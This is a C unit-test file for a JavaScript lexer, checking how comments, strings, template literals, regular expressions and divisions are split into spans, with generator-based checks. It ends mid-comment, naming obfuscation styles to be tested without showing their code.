/*
 * genome / textual_js - the javascript lexer and form of the textual part, through <kgenome.h> alone.
 *
 * WHAT IS ASSERTED. A text is rendered as its spans, a kind letter and the bytes in braces (textual_check.h):
 * M markup, T tag, C code, S string, K comment, with `*` after S when the form may rewrite the escapes of the
 * string and `!` when it is not closed. A regular expression and a template are STRING spans too, and only a
 * quoted string or a template with neither a tag nor a ${ } has the `*`.
 *
 * SIX KINDS OF EVIDENCE, each of a different strength:
 *   1. KNOWN ANSWERS. Every rule has a case, and next to it the case it could be confused for: "/" after a name
 *      and after "return", "}" of a block and of an object, a comment opener in a string and a string in a
 *      comment, a backtick in a ${ } in a template. The cases marked KNOWN LIMIT are where the grammar cannot be
 *      read without parsing: they pin what the lexer does today so a change to it is a decision.
 *   2. A GENERATOR (textual_js_gen.h, textual_js_stmt.h). Programs are built from a grammar in which every byte's
 *      class (code, string, regular expression, comment) is known when it is written - templates nested in
 *      templates, comments with the other tokens' openers in them, regular expressions with quotes in them, line
 *      terminators of all four kinds, "/" where only the grammar says whether it divides - laid out at random,
 *      lexed through the API, and the spans compared with what the generator knew.
 *      `textual_js --dump DIR N` writes N programs, what the generator knew of each (.exp) and its form (.form),
 *      for checks that need a JavaScript engine this test cannot assume: V8 compiles each program (all of the 6000
 *      tried, so the generator writes valid programs, which is what makes an assertion about it worth anything),
 *      TypeScript 6.0.3's parser finds the same literal and comment ranges (4905 of 6000; TypeScript cannot parse
 *      the rest, for instance "x.<newline>length instanceof []", which V8 accepts), and the form of each compiles
 *      and has the same syntax tree as the program (4905 of 4905).
 *   3. REAL FILES, outside this test, with the same two parsers: 25352 .js, .mjs and .cjs files of this machine that
 *      TypeScript parses (of 25519 distinct ones; the rest are php, html, binaries and broken scripts), 0 differences
 *      in the ranges of their strings, templates, regular expressions and comments, and 0 in the syntax tree of their
 *      forms (25354 files; 22396 of them compile as a script in V8 and so do their forms). The shared C-shaped
 *      lexer this one replaced read 187 of the first 24699 differently. The report has the scratch tools.
 *   4. The two properties of any input: the spans partition it, and the form of a form is itself, on random
 *      text of four alphabets, on every generated program, and on a megabyte of each opener.
 *   5. THE FORM, by known answer, with what keeps a program the same program: a line break is not a gap
 *      ("return\n{"), a comment across lines is a line break, "$" is a name byte, "/" before "in" after a literal.
 *   6. The decode hook through the js row.
 *
 * Every random sequence is a fixed seed: a failure is the same failure on every run.
 */

#include "textual_check.h"

#include <stddef.h>

static void js(const char *src, const char *want)
{
	expect_lang(KGENOME_TEXTUAL_LANG_JS, src, want);
}

static void jform(const char *src, const char *want)
{
	form_lang(KGENOME_TEXTUAL_LANG_JS, src, want);
}

/* ---- comments ------------------------------------------------------------------------- */

static void comments(void)
{
	js("", "");
	js("a // c\nb", "C{a }K{// c}C{\nb}");
	js("a /* c */ b", "C{a }K{/* c */}C{ b}");
	js("a /* c\n d */ b", "C{a }K{/* c\n d */}C{ b}");
	/* slash star slash is not a whole comment; slash star star slash is */
	js("/*/ x */ y", "K{/*/ x */}C{ y}");
	js("/**/ y", "K{/**/}C{ y}");
	js("/***/ y", "K{/***/}C{ y}");
	js("a /* x", "C{a }K!{/* x}");
	js("a // x", "C{a }K{// x}");
	/* a block comment does not nest, a line comment does not end at "*" "/", and each holds the other's opener */
	js("/* a /* b */ c */", "K{/* a /* b */}C{ c */}");
	js("// a /* b\nc */", "K{// a /* b}C{\nc */}");
	js("/* // */ a", "K{/* // */}C{ a}");
	/* a line comment ends at every line terminator: LF, CR (alone too), U+2028, U+2029 */
	js("a // c\rb", "C{a }K{// c}C{\rb}");
	js("a // c\r\nb", "C{a }K{// c}C{\r\nb}");
	js("a // c\xe2\x80\xa8" "b", "C{a }K{// c}C{\xe2\x80\xa8" "b}");
	js("a // c\xe2\x80\xa9" "b", "C{a }K{// c}C{\xe2\x80\xa9" "b}");
	/* ... and not at the other bytes of those encodings: U+2027 and U+202A are text */
	js("a // c\xe2\x80\xa7" "b", "C{a }K{// c\xe2\x80\xa7" "b}");
	js("a // c\xe2\x80\xaa" "b", "C{a }K{// c\xe2\x80\xaa" "b}");
	/* a division is not a comment */
	js("a / b", "C{a / b}");
	js("a / /* c */ b", "C{a / }K{/* c */}C{ b}");
	/* HASHBANG: a "#!" line at byte 0 only */
	js("#!/usr/bin/env node\nx", "K{#!/usr/bin/env node}C{\nx}");
	js("#!x", "K{#!x}");
	js(" #!x\ny", "C{ #!x\ny}");
	js("x\n#!y", "C{x\n#!y}");
	js("#x", "C{#x}");
	/* HTML-LIKE COMMENTS (Annex B, a classic script): "<!--" anywhere, "-->" only at the start of a line */
	js("a <!-- b\nc", "C{a }K{<!-- b}C{\nc}");
	js("a<!--b", "C{a}K{<!--b}");
	js("a < !--b", "C{a < !--b}");
	js("a <<!-- b", "C{a <<!-- b}");
	js("a <<<!-- b\nc", "C{a <<}K{<!-- b}C{\nc}");
	js("a <!- b", "C{a <!- b}");
	js("a\n--> b\nc", "C{a\n}K{--> b}C{\nc}");
	js("--> at the start\nc", "K{--> at the start}C{\nc}");
	js("a\n  --> b", "C{a\n  }K{--> b}");
	js("x --> y", "C{x --> y}");
	js("while (i --> 0) f()", "C{while (i --> 0) f()}");
	js("a /* c */ --> b", "C{a }K{/* c */}C{ --> b}");
	js("/* c */ --> b", "K{/* c */}C{ }K{--> b}");
	js("a /* c\n*/ --> b", "C{a }K{/* c\n*/}C{ }K{--> b}");
	js("a\n/* c */ --> b", "C{a\n}K{/* c */}C{ }K{--> b}");
	js("a\n-- > b", "C{a\n-- > b}");
	/* the opener inside a string or a template is the string's */
	js("'<!--'", "S*{'<!--'}");
	js("`\n-->`", "S*{`\n-->`}");
}

/* ---- strings -------------------------------------------------------------------------- */

static void strings(void)
{
	js("'a' \"b\"", "S*{'a'}C{ }S*{\"b\"}");
	js("'a\\'b' c", "S*{'a\\'b'}C{ c}");
	js("\"a\\\"b\" c", "S*{\"a\\\"b\"}C{ c}");
	js("'a\\\\' c", "S*{'a\\\\'}C{ c}");
	js("'it\"s' \"it's\"", "S*{'it\"s'}C{ }S*{\"it's\"}");
	/* a comment opener, a template opener and a regular expression in a string are the string's */
	js("'a // b' + \"/* c\" + '${x}'", "S*{'a // b'}C{ + }S*{\"/* c\"}C{ + }S*{'${x}'}");
	js("'/re/g' / 2", "S*{'/re/g'}C{ / 2}");
	/* a string in a comment is the comment's */
	js("// 'a\nb", "K{// 'a}C{\nb}");
	js("/* \" */ b \"x\"", "K{/* \" */}C{ b }S*{\"x\"}");
	/* NOT CLOSED: ends at the line terminator, LF or CR, which is code; at the end of the text */
	js("'ab\ncd'", "S*!{'ab}C{\ncd}S*!{'}");
	js("'ab\rcd", "S*!{'ab}C{\rcd}");
	js("'ab", "S*!{'ab}");
	js("'ab\\", "S*!{'ab\\}");
	js("\"", "S*!{\"}");
	/* ... but U+2028 and U+2029 are legal inside a string (ES2019) */
	js("'a\xe2\x80\xa8" "b' c", "S*{'a\xe2\x80\xa8" "b'}C{ c}");
	js("'a\xe2\x80\xa9" "b' c", "S*{'a\xe2\x80\xa9" "b'}C{ c}");
	/* A LINE CONTINUATION is a backslash and one line terminator, "\r\n" being one: the string goes on */
	js("'a\\\nb' c", "S*{'a\\\nb'}C{ c}");
	js("'a\\\r\nb' c", "S*{'a\\\r\nb'}C{ c}");
	js("'a\\\rb' c", "S*{'a\\\rb'}C{ c}");
	js("'a\\\xe2\x80\xa8" "b' c", "S*{'a\\\xe2\x80\xa8" "b'}C{ c}");
	/* ... and an escaped backslash is not one: the line break after it ends the string */
	js("'a\\\\\nb'", "S*!{'a\\\\}C{\nb}S*!{'}");
	/* every kind of escape is just a pair of bytes to the lexer */
	js("'\\x41\\u0041\\u{41}\\101\\0\\n' x", "S*{'\\x41\\u0041\\u{41}\\101\\0\\n'}C{ x}");
	/* two strings back to back are two spans */
	js("'a''b'", "S*{'a'}S*{'b'}");
}

/* ---- template literals ---------------------------------------------------------------- */

static void templates(void)
{
	/* a template with no ${ } and no tag may have its escapes rewritten (`*`), any other may not */
	js("`a` b", "S*{`a`}C{ b}");
	js("`a${b}c` d", "S{`a${b}c`}C{ d}");
	js("`a\nb`", "S*{`a\nb`}");
	js("`a\\`b` c", "S*{`a\\`b`}C{ c}");
	js("`a\\${b}` c", "S*{`a\\${b}`}C{ c}");
	js("`a$` c", "S*{`a$`}C{ c}");
	js("`a$$` c", "S*{`a$$`}C{ c}");
	js("`a$ {b}` c", "S*{`a$ {b}`}C{ c}");
	js("`$${b}` c", "S{`$${b}`}C{ c}");
	js("`${}` c", "S{`${}`}C{ c}");
	js("`${a}${b}` c", "S{`${a}${b}`}C{ c}");
	/* A BRACE, A BACKTICK, A QUOTE, A COMMENT, A REGEX IN THE SUBSTITUTION closes nothing */
	js("`${ {a:1}.a } x` y", "S{`${ {a:1}.a } x`}C{ y}");
	js("`${ '}' } x` y", "S{`${ '}' } x`}C{ y}");
	js("`${ \"`\" } x` y", "S{`${ \"`\" } x`}C{ y}");
	js("`${ /}/.test(a) } x` y", "S{`${ /}/.test(a) } x`}C{ y}");
	js("`${ /`/ } x` y", "S{`${ /`/ } x`}C{ y}");
	js("`${ a /* } ` */ } x` y", "S{`${ a /* } ` */ } x`}C{ y}");
	js("`${ a // } `\n } x` y", "S{`${ a // } `\n } x`}C{ y}");
	js("`${ (() => { return 1 })() } x` y", "S{`${ (() => { return 1 })() } x`}C{ y}");
	js("`${ function () { return `}` } } x` y", "S{`${ function () { return `}` } } x`}C{ y}");
	/* NESTED: a template in a substitution in a template, three deep */
	js("`a${`b${`c`}d`}e` f", "S{`a${`b${`c`}d`}e`}C{ f}");
	js("`${`${`${a}`}`}` f", "S{`${`${`${a}`}`}`}C{ f}");
	js("`${ `}` + `{` } x` y", "S{`${ `}` + `{` } x`}C{ y}");
	/* a "/" after a nested template's close divides, after the "}" of an expression ${ } it does too */
	js("`${ `a` / 2 }` / 2", "S{`${ `a` / 2 }`}C{ / 2}");
	/* TAGGED: the tag reads the raw text, so the form may not rewrite its escapes: no `*` */
	js("tag`a` b", "C{tag}S{`a`}C{ b}");
	js("a.b`a` b", "C{a.b}S{`a`}C{ b}");
	js("f()`a` b", "C{f()}S{`a`}C{ b}");
	js("a[0]`a` b", "C{a[0]}S{`a`}C{ b}");
	js("a\n`a`", "C{a\n}S{`a`}");
	js("return `a`", "C{return }S*{`a`}");
	js("x = `a`", "C{x = }S*{`a`}");
	js("if (a) `a`", "C{if (a) }S*{`a`}");
	/* a template holds line terminators of every kind and a line continuation, and is still one span */
	js("`a\r\nb\rc\xe2\x80\xa8" "d\\\ne` f", "S*{`a\r\nb\rc\xe2\x80\xa8" "d\\\ne`}C{ f}");
	js("`a\\\r\nb` c", "S*{`a\\\r\nb`}C{ c}");
	/* a regular expression, a string and a comment may each hold the others' openers inside a substitution */
	js("`${ /[}`]/ + '`' + \"}\" + /* ` } */ 1 }` x", "S{`${ /[}`]/ + '`' + \"}\" + /* ` } */ 1 }`}C{ x}");
	js("`${a}`+`${b}`", "S{`${a}`}C{+}S{`${b}`}");
	/* NOT CLOSED: open to the end of the text, whatever the substitutions were doing */
	js("`ab", "S*!{`ab}");
	js("x `ab${c}", "C{x }S!{`ab${c}}");
	js("`a${ 'b", "S!{`a${ 'b}");
	js("`a${ `b", "S!{`a${ `b}");
	js("`a${ b /* }`", "S!{`a${ b /* }`}");
	js("`a\\", "S*!{`a\\}");
	/* a stray "}" with nothing open is code */
	js("a } `b`", "C{a } }S*{`b`}");
}

/* ---- "/": division or a regular expression -------------------------------------------- */

static void regexes(void)
{
	/* a regular expression where an operand is expected: the start, after an operator or an opening bracket */
	js("/a/g.test(x)", "S{/a/g}C{.test(x)}");
	js("x = /a/", "C{x = }S{/a/}");
	js("f(/a/, /b/i)", "C{f(}S{/a/}C{, }S{/b/i}C{)}");
	js("[/a/]", "C{[}S{/a/}C{]}");
	js("!/a/.test(x)", "C{!}S{/a/}C{.test(x)}");
	js("a && /b/.test(c) || /d/", "C{a && }S{/b/}C{.test(c) || }S{/d/}");
	js("a ? /b/ : /c/", "C{a ? }S{/b/}C{ : }S{/c/}");
	js("a = b, /c/", "C{a = b, }S{/c/}");
	js("a; /b/.test(c)", "C{a; }S{/b/}C{.test(c)}");
	js("{ /a/.test(b) }", "C{{ }S{/a/}C{.test(b) }}");
	js("x => /a/.test(x)", "C{x => }S{/a/}C{.test(x)}");
	js("a +/b/", "C{a +}S{/b/}");
	js("a=/=/", "C{a=}S{/=/}");
	/* a regular expression after the words that expect an operand */
	js("return /a/", "C{return }S{/a/}");
	js("typeof /a/", "C{typeof }S{/a/}");
	js("x instanceof /a/", "C{x instanceof }S{/a/}");
	js("'a' in /b/", "S*{'a'}C{ in }S{/b/}");
	js("for (a of /b/) ;", "C{for (a of }S{/b/}C{) ;}");
	js("case /a/: break", "C{case }S{/a/}C{: break}");
	js("else /a/.test(x)", "C{else }S{/a/}C{.test(x)}");
	js("do /a/.test(x); while (0)", "C{do }S{/a/}C{.test(x); while (0)}");
	js("void /a/", "C{void }S{/a/}");
	js("delete /a/.x", "C{delete }S{/a/}C{.x}");
	js("throw /a/", "C{throw }S{/a/}");
	js("function* g() { yield /a/ }", "C{function* g() { yield }S{/a/}C{ }}");
	js("async function g() { await /a/ }", "C{async function g() { await }S{/a/}C{ }}");
	js("export default /a/", "C{export default }S{/a/}");
	/* DIVISION after an operand: a name, a number, a string, a regular expression, a template, ")" and "]" */
	js("a / b / c", "C{a / b / c}");
	js("a /b/ c", "C{a /b/ c}");
	js("a/b/c", "C{a/b/c}");
	js("1 / 2 / 3", "C{1 / 2 / 3}");
	js("(a) / b / c", "C{(a) / b / c}");
	js("a[0] / b / c", "C{a[0] / b / c}");
	js("f() / b / c", "C{f() / b / c}");
	js("'s' / b / c", "S*{'s'}C{ / b / c}");
	js("`t` / b / c", "S*{`t`}C{ / b / c}");
	js("/a/ / b / c", "S{/a/}C{ / b / c}");
	js("this / b / c", "C{this / b / c}");
	js("null / b / c", "C{null / b / c}");
	js("a /= b / c", "C{a /= b / c}");
	js("a /=b/ c", "C{a /=b/ c}");
	/* a word that is a keyword elsewhere is a name after a dot: a property */
	js("x.return / 2 / 3", "C{x.return / 2 / 3}");
	js("x.in / 2 / 3", "C{x.in / 2 / 3}");
	js("x?.typeof / 2 / 3", "C{x?.typeof / 2 / 3}");
	js("x.of / 2 / 3", "C{x.of / 2 / 3}");
	/* a number in any spelling is an operand */
	js("1.5 / 2 / 3", "C{1.5 / 2 / 3}");
	js(".5 / 2 / 3", "C{.5 / 2 / 3}");
	js("0x1f / 2 / 3", "C{0x1f / 2 / 3}");
	js("1e+5 / 2 / 3", "C{1e+5 / 2 / 3}");
	js("1e-5 / 2 / 3", "C{1e-5 / 2 / 3}");
	js("1_000 / 2 / 3", "C{1_000 / 2 / 3}");
	js("10n / 2 / 3", "C{10n / 2 / 3}");
	js("5..toString() / 2 / 3", "C{5..toString() / 2 / 3}");
	js("0xe+1 / 2 / 3", "C{0xe+1 / 2 / 3}");
	/* names: unicode, escaped, "$", "_" and a private name are all names */
	js("\xc3\xa9 / 2 / 3", "C{\xc3\xa9 / 2 / 3}");
	js("\xe5\x90\x8d\xe5\x89\x8d / 2 / 3", "C{\xe5\x90\x8d\xe5\x89\x8d / 2 / 3}");
	js("\\u0061bc / 2 / 3", "C{\\u0061bc / 2 / 3}");
	js("\\u{61} / 2 / 3", "C{\\u{61} / 2 / 3}");
	js("$ / 2 / 3", "C{$ / 2 / 3}");
	js("_ / 2 / 3", "C{_ / 2 / 3}");
	js("this.#p / 2 / 3", "C{this.#p / 2 / 3}");
	/* POSTFIX ++ keeps an operand an operand, PREFIX ++ does not */
	js("a++ / 2 / 3", "C{a++ / 2 / 3}");
	js("a-- / 2 / 3", "C{a-- / 2 / 3}");
	js("a\n++/b/.lastIndex", "C{a\n++}S{/b/}C{.lastIndex}");
	js("++/b/.lastIndex", "C{++}S{/b/}C{.lastIndex}");
	/* ")" of if, while, for and with is followed by a statement: a regular expression */
	js("if (a) /b/.test(c)", "C{if (a) }S{/b/}C{.test(c)}");
	js("while (a) /b/.test(c)", "C{while (a) }S{/b/}C{.test(c)}");
	js("for (;;) /b/.test(c)", "C{for (;;) }S{/b/}C{.test(c)}");
	js("for (a of b) /c/.test(a)", "C{for (a of b) }S{/c/}C{.test(a)}");
	js("for await (a of b) /c/.test(a)", "C{for await (a of b) }S{/c/}C{.test(a)}");
	js("with (a) /b/.test(c)", "C{with (a) }S{/b/}C{.test(c)}");
	js("if (a) if (b) /c/.test(d)", "C{if (a) if (b) }S{/c/}C{.test(d)}");
	js("if ((a) / b / c) d", "C{if ((a) / b / c) d}");
	js("if (a) { } else if (b) /c/.test(d)", "C{if (a) { } else if (b) }S{/c/}C{.test(d)}");
	/* ... a call of the same name as the keyword is not one */
	js("x.if(a) / b / c", "C{x.if(a) / b / c}");
	js("iff(a) / b / c", "C{iff(a) / b / c}");
	js("(a) / b / c", "C{(a) / b / c}");
	/* "}" ends a block (a statement may begin) or an object literal (an operand) */
	js("if (a) { }\n/b/.test(c)", "C{if (a) { }\n}S{/b/}C{.test(c)}");
	js("{ }\n/b/.test(c)", "C{{ }\n}S{/b/}C{.test(c)}");
	js("function f() { }\n/b/.test(c)", "C{function f() { }\n}S{/b/}C{.test(c)}");
	js("class A { }\n/b/.test(c)", "C{class A { }\n}S{/b/}C{.test(c)}");
	js("class A extends B { m() { } }\n/b/.test(c)", "C{class A extends B { m() { } }\n}S{/b/}C{.test(c)}");
	js("x = () => { }\n/b/.test(c)", "C{x = () => { }\n}S{/b/}C{.test(c)}");
	js("do { } while (a)\n/b/.test(c)", "C{do { } while (a)\n}S{/b/}C{.test(c)}");
	js("try { } catch (e) { }\n/b/.test(c)", "C{try { } catch (e) { }\n}S{/b/}C{.test(c)}");
	js("else { }\n/b/.test(c)", "C{else { }\n}S{/b/}C{.test(c)}");
	js("x = { a: 1 } / 2 / 3", "C{x = { a: 1 } / 2 / 3}");
	js("x = {} / 2 / 3", "C{x = {} / 2 / 3}");
	js("f({ a: 1 } / 2 / 3)", "C{f({ a: 1 } / 2 / 3)}");
	js("return {} / 2 / 3", "C{return {} / 2 / 3}");
	js("x = { a: { b: 1 } } / 2 / 3", "C{x = { a: { b: 1 } } / 2 / 3}");
	js("x = { a: 1, b: /c/ }", "C{x = { a: 1, b: }S{/c/}C{ }}");
	js("({ a: 1 }) / 2 / 3", "C{({ a: 1 }) / 2 / 3}");
	js("a: { }\n/b/.test(c)", "C{a: { }\n}S{/b/}C{.test(c)}");
	js("switch (a) { case 1: { }\n/b/.test(c) }", "C{switch (a) { case 1: { }\n}S{/b/}C{.test(c) }}");
	js("x = [{ }] / 2 / 3", "C{x = [{ }] / 2 / 3}");
	js("var { a } = /b/.exec(c)", "C{var { a } = }S{/b/}C{.exec(c)}");
	js("function f({ a }) { return /b/ }", "C{function f({ a }) { return }S{/b/}C{ }}");
	/* a "/" in a class, an escaped "/", a quote, the other kinds of text in a regular expression */
	js("/[/]/.test(a)", "S{/[/]/}C{.test(a)}");
	js("/[^/]*/.test(a)", "S{/[^/]*/}C{.test(a)}");
	js("/[\\]/]/.test(a)", "S{/[\\]/]/}C{.test(a)}");
	js("/\\//.test(a)", "S{/\\//}C{.test(a)}");
	js("/\\\\/.test(a)", "S{/\\\\/}C{.test(a)}");
	js("/[/*]/.test(a)", "S{/[/*]/}C{.test(a)}");
	js("/\"/.test(a) + 'x'", "S{/\"/}C{.test(a) + }S*{'x'}");
	js("/'/.test(a) + 'x'", "S{/'/}C{.test(a) + }S*{'x'}");
	js("/`/.test(a) + `x`", "S{/`/}C{.test(a) + }S*{`x`}");
	js("/\\/\\//.test(a)", "S{/\\/\\//}C{.test(a)}");
	js("/a{2}/.test(a)", "S{/a{2}/}C{.test(a)}");
	js("/${a}/.test(b)", "S{/${a}/}C{.test(b)}");
	js("/<!--/.test(b)", "S{/<!--/}C{.test(b)}");
	js("/a/dgimsuy", "S{/a/dgimsuy}");
	js("/a/ in b", "S{/a/}C{ in b}");
	js("/a/ instanceof b", "S{/a/}C{ instanceof b}");
	js("/a/g", "S{/a/g}");
	js("/a/.source", "S{/a/}C{.source}");
	/* a comment opener cannot begin a regular expression: a slash and a slash, a slash and a star, are comments */
	js("x = //a/\ny", "C{x = }K{//a/}C{\ny}");
	js("x = /*a*/ /b/", "C{x = }K{/*a*/}C{ }S{/b/}");
	/* NOT CLOSED ON ITS LINE: the guess was wrong, a regular expression is never open, so the "/" divides */
	js("a = b / c", "C{a = b / c}");
	js("a = / c", "C{a = / c}");
	js("a = /c\nd/", "C{a = /c\nd/}");
	js("a = /c[/\n", "C{a = /c[/\n}");
	js("a = /c\\", "C{a = /c\\}");
	js("a = /", "C{a = /}");
	/* U+2028 ends the line too */
	js("a = /c\xe2\x80\xa8/", "C{a = /c\xe2\x80\xa8/}");
	/* a regular expression and a comment on one line, a comment between the operand and the "/" */
	js("a /* x */ / b / c", "C{a }K{/* x */}C{ / b / c}");
	js("return /* x */ /b/", "C{return }K{/* x */}C{ }S{/b/}");
	js("a // x\n/b/g.test(c)", "C{a }K{// x}C{\n/b/g.test(c)}");
	/* the byte order mark and the other white space before a first "/" are white space, not a name */
	js("\xef\xbb\xbf/a/.test(b)", "C{\xef\xbb\xbf}S{/a/}C{.test(b)}");
	js("\xc2\xa0/a/.test(b)", "C{\xc2\xa0}S{/a/}C{.test(b)}");
	js("return\xc2\xa0/a/", "C{return\xc2\xa0}S{/a/}");
	js("return\xe3\x80\x80/a/", "C{return\xe3\x80\x80}S{/a/}");
	js("a\xe2\x80\xa8++/b/.x", "C{a\xe2\x80\xa8++}S{/b/}C{.x}");
}

/* ---- the places the grammar cannot be read without parsing: KNOWN LIMITS ---------------- */

static void known_limits(void)
{
	/* The "}" of a function EXPRESSION is an operand and "/" after it divides; the lexer calls every "}" after
	 * ")" a block's, because told apart it needs the statement the "function" began. The cost is a division by
	 * a function, which nothing writes. The regular expression it takes is closed at its own "/". */
	js("x = function () { } / 2 / 3", "C{x = function () { } }S{/ 2 /}C{ 3}");
	/* `of`, `yield` and `await` are names where nothing makes them operators; read as the operators they are
	 * in `for (a of b)`, so a division by a variable called `of` is a regular expression */
	js("of / 2 / 3", "C{of }S{/ 2 /}C{ 3}");
	js("await / 2 / 3", "C{await }S{/ 2 /}C{ 3}");
	/* a class inside a class in a "v"-flag regular expression: the first "]" ends the class for the lexer */
	js("/[[a]/]/v.test(x)", "S{/[[a]/}C{]/v.test(x)}");
	/* a template nested deeper than the stack tracks is open from the 512th substitution */
	{
		static char deep[3000];
		static char want[3300];
		unsigned k, w = 0;

		for (k = 0; k < 600; k++) {
			deep[w++] = '`';
			deep[w++] = '$';
			deep[w++] = '{';
		}
		deep[w] = 0;
		snprintf(want, sizeof want, "S!{%s}", deep);
		js(deep, want);
	}
}

/* ---- names and numbers ---------------------------------------------------------------- */

static void tokens(void)
{
	/* an identifier ends at a white space of the Zs category, a name goes on over the other non-ASCII bytes */
	js("a\xc2\xa0/ 2 / 3", "C{a\xc2\xa0/ 2 / 3}");
	js("x\xef\xbb\xbf/ 2 / 3", "C{x\xef\xbb\xbf/ 2 / 3}");
	/* `get` and `set` and `static` and `async` are names: a "/" after them divides */
	js("get / 2 / 3", "C{get / 2 / 3}");
	js("({ get: /a/ })", "C{({ get: }S{/a/}C{ })}");
	js("({ get x() { return 1 } }) / 2 / 3", "C{({ get x() { return 1 } }) / 2 / 3}");
	js("class A { get x() { } static y() { } }\n/a/.test(b)", "C{class A { get x() { } static y() { } }\n}S{/a/}C{.test(b)}");
	js("async / 2 / 3", "C{async / 2 / 3}");
	/* optional chaining, nullish, exponent: operators, and "?." before a digit is a conditional */
	js("a?.b / 2 / 3", "C{a?.b / 2 / 3}");
	js("a?.[0] / 2 / 3", "C{a?.[0] / 2 / 3}");
	js("a?.(b) / 2 / 3", "C{a?.(b) / 2 / 3}");
	js("a ?" "? /b/", "C{a ?" "? }S{/b/}");
	js("a ?" "?= /b/", "C{a ?" "?= }S{/b/}");
	js("a **= /b/", "C{a **= }S{/b/}");
	js("a ** 2 / 3 / 4", "C{a ** 2 / 3 / 4}");
	js("x?.5:/a/", "C{x?.5:}S{/a/}");
	js("x ?.5 : /a/", "C{x ?.5 : }S{/a/}");
	/* NUMERIC separators and every base */
	js("0b1_01 / 2 / 3", "C{0b1_01 / 2 / 3}");
	js("0o17 / 2 / 3", "C{0o17 / 2 / 3}");
	js("1_0.0_1e1_0 / 2 / 3", "C{1_0.0_1e1_0 / 2 / 3}");
	/* spread and rest are not a number's dots */
	js("f(...a) / 2 / 3", "C{f(...a) / 2 / 3}");
	js("[...a, /b/]", "C{[...a, }S{/b/}C{]}");
	/* a lone quote or backtick byte inside a regular expression inside a template substitution */
	js("`${ /\"/ }` + '\"'", "S{`${ /\"/ }`}C{ + }S*{'\"'}");
	/* a control byte, a NUL, a stray backslash and "@" are code */
	js("a \x01 b \\ c @d", "C{a \x01 b \\ c @d}");
}

#include "textual_js_gen.h"
#include "textual_js_stmt.h"

/* ---- running a program through the API -------------------------------------------------- */

#define GOT_MAX 8192u

struct got {
	struct kgenome_textual_span sp[GOT_MAX];
	uint32_t n, next, len;
	int      broken, over;
};

static int got_sink(void *u, const struct kgenome_textual_span *s)
{
	struct got *r = u;

	if (s->off != r->next || !s->len || (uint64_t)s->off + s->len > r->len ||
	    (uint64_t)s->open_len + s->close_len > s->len)
		r->broken = 1;
	r->next = s->off + s->len;
	if (r->n < GOT_MAX)
		r->sp[r->n++] = *s;
	else
		r->over = 1;
	return 1;
}

static enum kgenome_textual_status lex_all(struct got *r, const uint8_t *in, uint32_t n)
{
	struct kgenome_textual_lex_req rq = { .in = in, .n = n, .lang = KGENOME_TEXTUAL_LANG_JS, .sink = got_sink, .user = r };
	struct kgenome_textual_lex_res rs;
	enum kgenome_textual_status st;

	r->n = r->next = 0;
	r->len = n;
	r->broken = r->over = 0;
	st = kgenome_textual_lex(&rq, &rs);
	if (r->next != n)
		r->broken = 1;
	return st;
}

static void show(const uint8_t *p, uint32_t n)
{
	uint32_t i;

	for (i = 0; i < n; i++) {
		if (p[i] >= 0x20 && p[i] < 0x7f && p[i] != '\\')
			putchar(p[i]);
		else
			printf("\\x%02x", p[i]);
	}
}

static const char kind_letter[] = "MTCSK";

/* Does what the lexer said equal what the generator knew. */
static int same(const struct gen *g, const struct got *r, uint32_t *at)
{
	uint32_t i;

	if (r->broken || r->over)
		return *at = 0, 0;
	for (i = 0; i < g->nsp && i < r->n; i++) {
		const struct gspan *e = &g->sp[i];
		const struct kgenome_textual_span *a = &r->sp[i];
		uint8_t kind = e->cls == G_CODE ? KGENOME_TEXTUAL_CODE : e->cls == G_STR ? KGENOME_TEXTUAL_STRING : KGENOME_TEXTUAL_COMMENT;
		uint8_t fl = e->cls == G_STR && e->interp ? KGENOME_TEXTUAL_F_INTERP : 0u;

		if (a->kind != kind || a->off != e->off || a->len != e->len || a->flags != fl ||
		    (e->cls != G_CODE && (a->open_len != e->open || a->close_len != e->close))) {
			*at = i;
			return 0;
		}
	}
	*at = i;
	return g->nsp == r->n;
}

static void report(const struct gen *g, const struct got *r, uint32_t i, uint32_t prog)
{
	uint32_t k, lo = i > 2u ? i - 2u : 0u;

	printf("  FAIL generated program %u: span %u differs (partition %s)\n", prog, i, r->broken ? "BROKEN" : "ok");
	for (k = lo; k < i + 2u; k++) {
		if (k < g->nsp) {
			const struct gspan *e = &g->sp[k];

			printf("       generator %u: %c off %u len %u open %u close %u interp %u  ", k, "CSK"[e->cls], e->off, e->len, e->open, e->close, e->interp);
			show(g->buf + e->off, e->len > 70u ? 70u : e->len);
			printf("\n");
		}
		if (k < r->n) {
			const struct kgenome_textual_span *a = &r->sp[k];

			printf("       lexer     %u: %c off %u len %u open %u close %u flags %u  ", k, kind_letter[a->kind], a->off, a->len, a->open_len, a->close_len, a->flags);
			show(g->buf + a->off, a->len > 70u ? 70u : a->len);
			printf("\n");
		}
	}
}

static struct gen G;
static struct got R;

/* The shape of what was generated, so that a generator that stopped producing something is a failure too. */
struct census {
	uint32_t progs, bytes, spans, regex, tpl, tpl_subst, tpl_nested, comments, html, hashbang, str;
	uint32_t block_lt, interp_tpl;
};

static void count(struct census *c, const struct gen *g)
{
	uint32_t i;

	c->progs++;
	c->bytes += g->n;
	c->spans += g->nsp;
	for (i = 0; i < g->nsp; i++) {
		const struct gspan *e = &g->sp[i];
		const uint8_t *s = g->buf + e->off;

		if (e->cls == G_STR && s[0] == '/')
			c->regex++;
		else if (e->cls == G_STR && s[0] == '`') {
			c->tpl++;
			c->tpl_subst += memchr(s, '{', e->len) != NULL && !e->interp;
			c->interp_tpl += e->interp;
			if (e->len > 6u) {
				uint32_t k;

				for (k = 1; k + 2u < e->len; k++)
					if (s[k] == '$' && s[k + 1u] == '{') {
						uint32_t j;

						for (j = k + 2u; j + 1u < e->len; j++)
							if (s[j] == '`') {
								c->tpl_nested++;
								break;
							}
						break;
					}
			}
		} else if (e->cls == G_STR) {
			c->str++;
		} else if (e->cls == G_COM) {
			c->comments++;
			c->html += s[0] == '<' || s[0] == '-';
			c->hashbang += s[0] == '#';
			c->block_lt += s[1] == '*' && memchr(s, '\n', e->len) != NULL;
		}
	}
}

/*
 * CODE IN THE STYLE OF THE TOOLS THAT HIDE IT, each checked outside this test the same way: V8 compiles it and TypeScript's
 * parser finds exactly these ranges. The cases are Dean Edwards' packer (a regular expression after "(" and a string after
 * `return`), obfuscator.io's string array and hex escapes, aaencode (a regular expression holding a comment opener and
 * followed by a comment, and names of non-ASCII letters), a jjencode-shaped program (a name made of "$" and "_"), jsfuck
 * (nothing but "[]()!+"), a wsh script (a division by a name after "/" and a regular expression with quotes in it), and a node web shell
